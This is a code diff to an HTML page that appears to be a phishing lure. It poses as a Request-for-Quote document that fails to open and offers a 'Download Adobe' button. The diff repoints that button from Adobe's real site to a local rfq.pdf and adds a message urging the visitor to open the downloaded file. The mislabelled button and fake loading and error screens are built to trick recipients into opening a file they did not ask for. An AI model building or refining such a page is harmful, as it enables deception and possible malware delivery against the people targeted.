@@ -378,6 +378,13 @@
         background: #e7e7e7;
       }
 
+      .download-status {
+        margin: 0.9rem 0 0;
+        color: #4b4b4b;
+        font-size: 0.88rem;
+        line-height: 1.4;
+      }
+
       h2,
       p {
         margin-top: 0;
@@ -862,23 +869,26 @@
           <a
             id="download-button"
             class="primary-button"
-            href="https://get.adobe.com/reader/"
-            rel="noopener noreferrer"
+            href="./rfq.pdf"
+            download="rfq.pdf"
           >
             Download Adobe
           </a>
         </div>
+        <p id="download-status" class="download-status" aria-live="polite" hidden></p>
       </section>
     </main>
 
     <!--
-      Edit these values to customize the display text.
+      Edit these values to customize the display text and local PDF download.
+      Keep downloadFileName/downloadPath pointed at a PDF document in this same directory.
     -->
     <script type="application/json" id="page-config">
       {
         "companyName": "Renovation Sells. RFQ",
         "documentName": "Request-for-Quote.pdf",
-        "downloadUrl": "https://get.adobe.com/reader/",
+        "downloadFileName": "rfq.pdf",
+        "downloadPath": "./rfq.pdf",
         "loadingDelayMs": 10000
       }
     </script>
@@ -890,21 +900,39 @@
       const rfqCompanyName = document.querySelector("#rfq-company-name");
       const openingFileName = document.querySelector("#opening-file-name");
       const downloadButton = document.querySelector("#download-button");
+      const downloadStatus = document.querySelector("#download-status");
       const cancelButton = document.querySelector("#cancel-button");
 
       const config = JSON.parse(configElement.textContent);
       const configuredCompanyName = config.companyName || "Renovation Sells. RFQ";
       const configuredDocumentName = config.documentName || "Request-for-Quote.pdf";
-      const configuredDownloadUrl = config.downloadUrl || "https://get.adobe.com/reader/";
+      const configuredDownloadFileName = config.downloadFileName || "rfq.pdf";
+      const configuredDownloadPath = config.downloadPath || `./${configuredDownloadFileName}`;
+      const safeDownloadFileName = configuredDownloadFileName.toLowerCase().endsWith(".pdf")
+        ? configuredDownloadFileName
+        : "rfq.pdf";
+      const safeDownloadPath = configuredDownloadPath.toLowerCase().endsWith(".pdf")
+        ? configuredDownloadPath
+        : `./${safeDownloadFileName}`;
       const loadingDelayMs = Number(config.loadingDelayMs) || 10000;
       document.documentElement.style.setProperty("--spin-duration", `${loadingDelayMs}ms`);
 
       rfqCompanyName.textContent = configuredCompanyName;
       openingFileName.textContent = configuredDocumentName;
-      downloadButton.href = configuredDownloadUrl;
+      downloadButton.href = safeDownloadPath;
+      downloadButton.download = safeDownloadFileName;
 
       cancelButton.addEventListener("click", () => {
         errorDialog.hidden = true;
+      });
+
+      downloadButton.addEventListener("click", () => {
+        downloadStatus.hidden = false;
+        downloadStatus.textContent = "Downloading...";
+
+        window.setTimeout(() => {
+          downloadStatus.textContent = "Download complete. Open the downloaded file to access document.";
+        }, 1800);
       });
 
       window.setTimeout(() => {
